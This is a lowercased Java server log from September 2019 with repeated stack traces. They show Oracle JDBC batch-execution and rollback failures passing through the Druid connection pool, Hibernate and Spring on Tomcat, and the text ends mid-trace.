caused by: java.lang.arrayindexoutofboundsexception at java.lang.system.arraycopy(native method) at oracle.jdbc.driver.t4crowidaccessor.unmarshalonerow(t4crowidaccessor.java:203) at oracle.jdbc.driver.t4c8oall.readrxd(t4c8oall.java:696) at oracle.jdbc.driver.t4cttifun.receive(t4cttifun.java:340) at oracle.jdbc.driver.t4cttifun.dorpc(t4cttifun.java:192) at oracle.jdbc.driver.t4c8oall.dooall(t4c8oall.java:531) at oracle.jdbc.driver.t4cpreparedstatement.dooall8(t4cpreparedstatement.java:207) at oracle.jdbc.driver.t4cpreparedstatement.executeforrows(t4cpreparedstatement.java:1044) at oracle.jdbc.driver.oraclepreparedstatement.executeforrowswithtimeout(oraclepreparedstatement.java:10143) at oracle.jdbc.driver.oraclepreparedstatement.executebatch(oraclepreparedstatement.java:10249) at oracle.jdbc.driver.oraclestatementwrapper.executebatch(oraclestatementwrapper.java:230) at com.alibaba.druid.filter.filterchainimpl.statement_executebatch(filterchainimpl.java:3066) at com.alibaba.druid.filter.filteradapter.statement_executebatch(filteradapter.java:2496) at com.alibaba.druid.filter.filtereventadapter.statement_executebatch(filtereventadapter.java:279) at com.alibaba.druid.filter.filterchainimpl.statement_executebatch(filterchainimpl.java:3064) at com.alibaba.druid.wall.wallfilter.statement_executebatch(wallfilter.java:503) at com.alibaba.druid.filter.filterchainimpl.statement_executebatch(filterchainimpl.java:3064) at com.alibaba.druid.filter.filteradapter.statement_executebatch(filteradapter.java:2496) at com.alibaba.druid.filter.filtereventadapter.statement_executebatch(filtereventadapter.java:279) at com.alibaba.druid.filter.filterchainimpl.statement_executebatch(filterchainimpl.java:3064) at com.alibaba.druid.proxy.jdbc.statementproxyimpl.executebatch(statementproxyimpl.java:202) at com.alibaba.druid.pool.druidpooledpreparedstatement.executebatch(druidpooledpreparedstatement.java:566) ..
2019-09-25 09:24:32,900 error [com.alibaba.druid.util.jdbcutils] - close connection error
java.sql.sqlexception: : [8, 1] at oracle.jdbc.driver.t4cttifun.receive(t4cttifun.java:464) at oracle.jdbc.driver.t4cttifun.dorpc(t4cttifun.java:192) at oracle.jdbc.driver.t4c7ocommoncall.doologoff(t4c7ocommoncall.java:61) at oracle.jdbc.driver.t4cconnection.logoff(t4cconnection.java:543) at oracle.jdbc.driver.physicalconnection.close(physicalconnection.java:3984) at com.alibaba.druid.filter.filterchainimpl.connection_close(filterchainimpl.java:186) at com.alibaba.druid.filter.filteradapter.connection_close(filteradapter.java:776) at com.alibaba.druid.filter.logging.logfilter.connection_close(logfilter.java:440) at com.alibaba.druid.filter.filterchainimpl.connection_close(filterchainimpl.java:181) at com.alibaba.druid.filter.filteradapter.connection_close(filteradapter.java:776) at com.alibaba.druid.filter.filterchainimpl.connection_close(filterchainimpl.java:181) at com.alibaba.druid.filter.stat.statfilter.connection_close(statfilter.java:261) at com.alibaba.druid.filter.filterchainimpl.connection_close(filterchainimpl.java:181) at com.alibaba.druid.proxy.jdbc.connectionproxyimpl.close(connectionproxyimpl.java:115) at com.alibaba.druid.util.jdbcutils.close(jdbcutils.java:73) at com.alibaba.druid.pool.druiddatasource.discardconnection(druiddatasource.java:1357) at com.alibaba.druid.pool.druiddatasource.handlefatalerror(druiddatasource.java:1622) at com.alibaba.druid.pool.druiddatasource.handleconnectionexception(druiddatasource.java:1564) at com.alibaba.druid.pool.druidpooledconnection.handleexception(druidpooledconnection.java:133) at com.alibaba.druid.pool.druidpooledconnection.rollback(druidpooledconnection.java:783) at com.nstc.dtp.rm.datasource.connectionproxy.rollback(connectionproxy.java:238) at org.hibernate.transaction.jdbctransaction.rollbackandresetautocommit(jdbctransaction.java:217) at org.hibernate.transaction.jdbctransaction.rollback(jdbctransaction.java:196) at org.springframework.orm.hibernate3.hibernatetransactionmanager.dorollback(hibernatetransactionmanager.java:674) at org.springframework.transaction.support.abstractplatformtransactionmanager.dorollbackoncommitexception(abstractplatformtransactionmanager.java:873) at org.springframework.transaction.support.abstractplatformtransactionmanager.processcommit(abstractplatformtransactionmanager.java:760) at org.springframework.transaction.support.abstractplatformtransactionmanager.commit(abstractplatformtransactionmanager.java:701) at org.springframework.transaction.interceptor.transactionaspectsupport.committransactionafterreturning(transactionaspectsupport.java:321) at com.nstc.framework.spring.transactioninterceptor.committransactionafterreturning(transactioninterceptor.java:39) at org.springframework.transaction.interceptor.transactioninterceptor.invoke(transactioninterceptor.java:116) at com.nstc.framework.spring.transactioninterceptor.invoke(transactioninterceptor.java:35) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy11.acceptoperation(unknown source) at com.nstc.dtp.action.acceptoperationaction.execute(acceptoperationaction.java:31) at com.nstc.dtp.defaulteventserver$1.doinopensession(defaulteventserver.java:154) at com.nstc.framework.orm.hibernate3.opensessiontemplate.execute(opensessiontemplate.java:152) at com.nstc.dtp.defaulteventserver.execevent(defaulteventserver.java:152) at com.nstc.dtp.defaulteventserver.execute(defaulteventserver.java:305) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.aop.support.aoputils.invokejoinpointusingreflection(aoputils.java:307) at org.springframework.aop.framework.reflectivemethodinvocation.invokejoinpoint(reflectivemethodinvocation.java:182) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:149) at org.springframework.remoting.support.remoteinvocationtraceinterceptor.invoke(remoteinvocationtraceinterceptor.java:77) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy12.execute(unknown source) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.remoting.support.remoteinvocation.invoke(remoteinvocation.java:205) at org.springframework.remoting.support.defaultremoteinvocationexecutor.invoke(defaultremoteinvocationexecutor.java:38) at org.springframework.remoting.support.remoteinvocationbasedexporter.invoke(remoteinvocationbasedexporter.java:78) at org.springframework.remoting.support.remoteinvocationbasedexporter.invokeandcreateresult(remoteinvocationbasedexporter.java:114) at org.springframework.remoting.httpinvoker.httpinvokerserviceexporter.handlerequest(httpinvokerserviceexporter.java:74) at org.springframework.web.servlet.mvc.httprequesthandleradapter.handle(httprequesthandleradapter.java:49) at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:875) at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:807) at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:571) at org.springframework.web.servlet.frameworkservlet.dopost(frameworkservlet.java:511) at javax.servlet.http.httpservlet.service(httpservlet.java:709) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:71) at javax.servlet.http.httpservlet.service(httpservlet.java:802) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:59) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:237) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:157) at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:214) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardcontextvalve.invokeinternal(standardcontextvalve.java:198) at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:152) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:137) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:118) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:102) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:109) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.containerbase.invoke(containerbase.java:929) at org.apache.coyote.tomcat5.coyoteadapter.service(coyoteadapter.java:160) at org.apache.coyote.http11.http11processor.process(http11processor.java:799) at org.apache.coyote.http11.http11protocol$http11connectionhandler.processconnection(http11protocol.java:705) at org.apache.tomcat.util.net.tcpworkerthread.runit(pooltcpendpoint.java:577) at org.apache.tomcat.util.threads.threadpool$controlrunnable.run(threadpool.java:683) at java.lang.thread.run(thread.java:745)
2019-09-25 09:24:32,901 error [com.alibaba.druid.pool.druiddatasource] - discard connection
java.sql.sqlexception: : [0] at oracle.jdbc.driver.t4cttifun.receive(t4cttifun.java:464) at oracle.jdbc.driver.t4cttifun.dorpc(t4cttifun.java:192) at oracle.jdbc.driver.t4c7ocommoncall.doorollback(t4c7ocommoncall.java:68) at oracle.jdbc.driver.t4cconnection.dorollback(t4cconnection.java:694) at oracle.jdbc.driver.physicalconnection.rollback(physicalconnection.java:3943) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:714) at com.alibaba.druid.filter.filteradapter.connection_rollback(filteradapter.java:973) at com.alibaba.druid.filter.logging.logfilter.connection_rollback(logfilter.java:404) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:709) at com.alibaba.druid.filter.filteradapter.connection_rollback(filteradapter.java:973) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:709) at com.alibaba.druid.filter.stat.statfilter.connection_rollback(statfilter.java:275) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:709) at com.alibaba.druid.proxy.jdbc.connectionproxyimpl.rollback(connectionproxyimpl.java:400) at com.alibaba.druid.pool.druidpooledconnection.rollback(druidpooledconnection.java:781) at com.nstc.dtp.rm.datasource.connectionproxy.rollback(connectionproxy.java:238) at org.hibernate.transaction.jdbctransaction.rollbackandresetautocommit(jdbctransaction.java:217) at org.hibernate.transaction.jdbctransaction.rollback(jdbctransaction.java:196) at org.springframework.orm.hibernate3.hibernatetransactionmanager.dorollback(hibernatetransactionmanager.java:674) at org.springframework.transaction.support.abstractplatformtransactionmanager.dorollbackoncommitexception(abstractplatformtransactionmanager.java:873) at org.springframework.transaction.support.abstractplatformtransactionmanager.processcommit(abstractplatformtransactionmanager.java:760) at org.springframework.transaction.support.abstractplatformtransactionmanager.commit(abstractplatformtransactionmanager.java:701) at org.springframework.transaction.interceptor.transactionaspectsupport.committransactionafterreturning(transactionaspectsupport.java:321) at com.nstc.framework.spring.transactioninterceptor.committransactionafterreturning(transactioninterceptor.java:39) at org.springframework.transaction.interceptor.transactioninterceptor.invoke(transactioninterceptor.java:116) at com.nstc.framework.spring.transactioninterceptor.invoke(transactioninterceptor.java:35) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy11.acceptoperation(unknown source) at com.nstc.dtp.action.acceptoperationaction.execute(acceptoperationaction.java:31) at com.nstc.dtp.defaulteventserver$1.doinopensession(defaulteventserver.java:154) at com.nstc.framework.orm.hibernate3.opensessiontemplate.execute(opensessiontemplate.java:152) at com.nstc.dtp.defaulteventserver.execevent(defaulteventserver.java:152) at com.nstc.dtp.defaulteventserver.execute(defaulteventserver.java:305) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.aop.support.aoputils.invokejoinpointusingreflection(aoputils.java:307) at org.springframework.aop.framework.reflectivemethodinvocation.invokejoinpoint(reflectivemethodinvocation.java:182) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:149) at org.springframework.remoting.support.remoteinvocationtraceinterceptor.invoke(remoteinvocationtraceinterceptor.java:77) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy12.execute(unknown source) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.remoting.support.remoteinvocation.invoke(remoteinvocation.java:205) at org.springframework.remoting.support.defaultremoteinvocationexecutor.invoke(defaultremoteinvocationexecutor.java:38) at org.springframework.remoting.support.remoteinvocationbasedexporter.invoke(remoteinvocationbasedexporter.java:78) at org.springframework.remoting.support.remoteinvocationbasedexporter.invokeandcreateresult(remoteinvocationbasedexporter.java:114) at org.springframework.remoting.httpinvoker.httpinvokerserviceexporter.handlerequest(httpinvokerserviceexporter.java:74) at org.springframework.web.servlet.mvc.httprequesthandleradapter.handle(httprequesthandleradapter.java:49) at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:875) at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:807) at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:571) at org.springframework.web.servlet.frameworkservlet.dopost(frameworkservlet.java:511) at javax.servlet.http.httpservlet.service(httpservlet.java:709) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:71) at javax.servlet.http.httpservlet.service(httpservlet.java:802) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:59) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:237) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:157) at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:214) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardcontextvalve.invokeinternal(standardcontextvalve.java:198) at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:152) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:137) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:118) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:102) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:109) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.containerbase.invoke(containerbase.java:929) at org.apache.coyote.tomcat5.coyoteadapter.service(coyoteadapter.java:160) at org.apache.coyote.http11.http11processor.process(http11processor.java:799) at org.apache.coyote.http11.http11protocol$http11connectionhandler.processconnection(http11protocol.java:705) at org.apache.tomcat.util.net.tcpworkerthread.runit(pooltcpendpoint.java:577) at org.apache.tomcat.util.threads.threadpool$controlrunnable.run(threadpool.java:683) at java.lang.thread.run(thread.java:745)
2019-09-25 09:24:32,902 error [org.hibernate.transaction.jdbctransaction] - could not toggle autocommit
java.sql.sqlexception: connection holder is null at com.alibaba.druid.pool.druidpooledconnection.checkstateinternal(druidpooledconnection.java:1155) at com.alibaba.druid.pool.druidpooledconnection.checkstate(druidpooledconnection.java:1148) at com.alibaba.druid.pool.druidpooledconnection.getautocommit(druidpooledconnection.java:736) at com.nstc.dtp.rm.datasource.abstractconnectionproxy.getautocommit(abstractconnectionproxy.java:115) at com.nstc.dtp.rm.datasource.connectionproxy.setautocommit(connectionproxy.java:249) at org.hibernate.transaction.jdbctransaction.toggleautocommit(jdbctransaction.java:228) at org.hibernate.transaction.jdbctransaction.rollbackandresetautocommit(jdbctransaction.java:220) at org.hibernate.transaction.jdbctransaction.rollback(jdbctransaction.java:196) at org.springframework.orm.hibernate3.hibernatetransactionmanager.dorollback(hibernatetransactionmanager.java:674) at org.springframework.transaction.support.abstractplatformtransactionmanager.dorollbackoncommitexception(abstractplatformtransactionmanager.java:873) at org.springframework.transaction.support.abstractplatformtransactionmanager.processcommit(abstractplatformtransactionmanager.java:760) at org.springframework.transaction.support.abstractplatformtransactionmanager.commit(abstractplatformtransactionmanager.java:701) at org.springframework.transaction.interceptor.transactionaspectsupport.committransactionafterreturning(transactionaspectsupport.java:321) at com.nstc.framework.spring.transactioninterceptor.committransactionafterreturning(transactioninterceptor.java:39) at org.springframework.transaction.interceptor.transactioninterceptor.invoke(transactioninterceptor.java:116) at com.nstc.framework.spring.transactioninterceptor.invoke(transactioninterceptor.java:35) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy11.acceptoperation(unknown source) at com.nstc.dtp.action.acceptoperationaction.execute(acceptoperationaction.java:31) at com.nstc.dtp.defaulteventserver$1.doinopensession(defaulteventserver.java:154) at com.nstc.framework.orm.hibernate3.opensessiontemplate.execute(opensessiontemplate.java:152) at com.nstc.dtp.defaulteventserver.execevent(defaulteventserver.java:152) at com.nstc.dtp.defaulteventserver.execute(defaulteventserver.java:305) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.aop.support.aoputils.invokejoinpointusingreflection(aoputils.java:307) at org.springframework.aop.framework.reflectivemethodinvocation.invokejoinpoint(reflectivemethodinvocation.java:182) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:149) at org.springframework.remoting.support.remoteinvocationtraceinterceptor.invoke(remoteinvocationtraceinterceptor.java:77) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy12.execute(unknown source) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.remoting.support.remoteinvocation.invoke(remoteinvocation.java:205) at org.springframework.remoting.support.defaultremoteinvocationexecutor.invoke(defaultremoteinvocationexecutor.java:38) at org.springframework.remoting.support.remoteinvocationbasedexporter.invoke(remoteinvocationbasedexporter.java:78) at org.springframework.remoting.support.remoteinvocationbasedexporter.invokeandcreateresult(remoteinvocationbasedexporter.java:114) at org.springframework.remoting.httpinvoker.httpinvokerserviceexporter.handlerequest(httpinvokerserviceexporter.java:74) at org.springframework.web.servlet.mvc.httprequesthandleradapter.handle(httprequesthandleradapter.java:49) at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:875) at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:807) at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:571) at org.springframework.web.servlet.frameworkservlet.dopost(frameworkservlet.java:511) at javax.servlet.http.httpservlet.service(httpservlet.java:709) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:71) at javax.servlet.http.httpservlet.service(httpservlet.java:802) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:59) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:237) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:157) at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:214) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardcontextvalve.invokeinternal(standardcontextvalve.java:198) at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:152) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:137) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:118) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:102) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:109) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.containerbase.invoke(containerbase.java:929) at org.apache.coyote.tomcat5.coyoteadapter.service(coyoteadapter.java:160) at org.apache.coyote.http11.http11processor.process(http11processor.java:799) at org.apache.coyote.http11.http11protocol$http11connectionhandler.processconnection(http11protocol.java:705) at org.apache.tomcat.util.net.tcpworkerthread.runit(pooltcpendpoint.java:577) at org.apache.tomcat.util.threads.threadpool$controlrunnable.run(threadpool.java:683) at java.lang.thread.run(thread.java:745)
caused by: java.sql.sqlexception: : [0] at oracle.jdbc.driver.t4cttifun.receive(t4cttifun.java:464) at oracle.jdbc.driver.t4cttifun.dorpc(t4cttifun.java:192) at oracle.jdbc.driver.t4c7ocommoncall.doorollback(t4c7ocommoncall.java:68) at oracle.jdbc.driver.t4cconnection.dorollback(t4cconnection.java:694) at oracle.jdbc.driver.physicalconnection.rollback(physicalconnection.java:3943) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:714) at com.alibaba.druid.filter.filteradapter.connection_rollback(filteradapter.java:973) at com.alibaba.druid.filter.logging.logfilter.connection_rollback(logfilter.java:404) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:709) at com.alibaba.druid.filter.filteradapter.connection_rollback(filteradapter.java:973) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:709) at com.alibaba.druid.filter.stat.statfilter.connection_rollback(statfilter.java:275) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:709) at com.alibaba.druid.proxy.jdbc.connectionproxyimpl.rollback(connectionproxyimpl.java:400) at com.alibaba.druid.pool.druidpooledconnection.rollback(druidpooledconnection.java:781) at com.nstc.dtp.rm.datasource.connectionproxy.rollback(connectionproxy.java:238) at org.hibernate.transaction.jdbctransaction.rollbackandresetautocommit(jdbctransaction.java:217) ..
2019-09-25 09:24:32,903 error [org.hibernate.transaction.jdbctransaction] - jdbc rollback failed
java.sql.sqlexception: : [0] at oracle.jdbc.driver.t4cttifun.receive(t4cttifun.java:464) at oracle.jdbc.driver.t4cttifun.dorpc(t4cttifun.java:192) at oracle.jdbc.driver.t4c7ocommoncall.doorollback(t4c7ocommoncall.java:68) at oracle.jdbc.driver.t4cconnection.dorollback(t4cconnection.java:694) at oracle.jdbc.driver.physicalconnection.rollback(physicalconnection.java:3943) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:714) at com.alibaba.druid.filter.filteradapter.connection_rollback(filteradapter.java:973) at com.alibaba.druid.filter.logging.logfilter.connection_rollback(logfilter.java:404) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:709) at com.alibaba.druid.filter.filteradapter.connection_rollback(filteradapter.java:973) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:709) at com.alibaba.druid.filter.stat.statfilter.connection_rollback(statfilter.java:275) at com.alibaba.druid.filter.filterchainimpl.connection_rollback(filterchainimpl.java:709) at com.alibaba.druid.proxy.jdbc.connectionproxyimpl.rollback(connectionproxyimpl.java:400) at com.alibaba.druid.pool.druidpooledconnection.rollback(druidpooledconnection.java:781) at com.nstc.dtp.rm.datasource.connectionproxy.rollback(connectionproxy.java:238) at org.hibernate.transaction.jdbctransaction.rollbackandresetautocommit(jdbctransaction.java:217) at org.hibernate.transaction.jdbctransaction.rollback(jdbctransaction.java:196) at org.springframework.orm.hibernate3.hibernatetransactionmanager.dorollback(hibernatetransactionmanager.java:674) at org.springframework.transaction.support.abstractplatformtransactionmanager.dorollbackoncommitexception(abstractplatformtransactionmanager.java:873) at org.springframework.transaction.support.abstractplatformtransactionmanager.processcommit(abstractplatformtransactionmanager.java:760) at org.springframework.transaction.support.abstractplatformtransactionmanager.commit(abstractplatformtransactionmanager.java:701) at org.springframework.transaction.interceptor.transactionaspectsupport.committransactionafterreturning(transactionaspectsupport.java:321) at com.nstc.framework.spring.transactioninterceptor.committransactionafterreturning(transactioninterceptor.java:39) at org.springframework.transaction.interceptor.transactioninterceptor.invoke(transactioninterceptor.java:116) at com.nstc.framework.spring.transactioninterceptor.invoke(transactioninterceptor.java:35) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy11.acceptoperation(unknown source) at com.nstc.dtp.action.acceptoperationaction.execute(acceptoperationaction.java:31) at com.nstc.dtp.defaulteventserver$1.doinopensession(defaulteventserver.java:154) at com.nstc.framework.orm.hibernate3.opensessiontemplate.execute(opensessiontemplate.java:152) at com.nstc.dtp.defaulteventserver.execevent(defaulteventserver.java:152) at com.nstc.dtp.defaulteventserver.execute(defaulteventserver.java:305) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.aop.support.aoputils.invokejoinpointusingreflection(aoputils.java:307) at org.springframework.aop.framework.reflectivemethodinvocation.invokejoinpoint(reflectivemethodinvocation.java:182) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:149) at org.springframework.remoting.support.remoteinvocationtraceinterceptor.invoke(remoteinvocationtraceinterceptor.java:77) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:171) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:204) at com.sun.proxy.$proxy12.execute(unknown source) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:57) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:606) at org.springframework.remoting.support.remoteinvocation.invoke(remoteinvocation.java:205) at org.springframework.remoting.support.defaultremoteinvocationexecutor.invoke(defaultremoteinvocationexecutor.java:38) at org.springframework.remoting.support.remoteinvocationbasedexporter.invoke(remoteinvocationbasedexporter.java:78) at org.springframework.remoting.support.remoteinvocationbasedexporter.invokeandcreateresult(remoteinvocationbasedexporter.java:114) at org.springframework.remoting.httpinvoker.httpinvokerserviceexporter.handlerequest(httpinvokerserviceexporter.java:74) at org.springframework.web.servlet.mvc.httprequesthandleradapter.handle(httprequesthandleradapter.java:49) at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:875) at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:807) at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:571) at org.springframework.web.servlet.frameworkservlet.dopost(frameworkservlet.java:511) at javax.servlet.http.httpservlet.service(httpservlet.java:709) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:71) at javax.servlet.http.httpservlet.service(httpservlet.java:802) at com.nstc.framework.servlet.nstcdispatcherservlet.service(nstcdispatcherservlet.java:59) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:237) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:157) at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:214) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardcontextvalve.invokeinternal(standardcontextvalve.java:198) at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:152) at org.apache.catalina.core.standardvalvecontext.invokenext(standardvalvecontext.java:104) at org.apache.catalina.core.standardpipeline.invoke(standardpipeline.java:520) at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:137) at 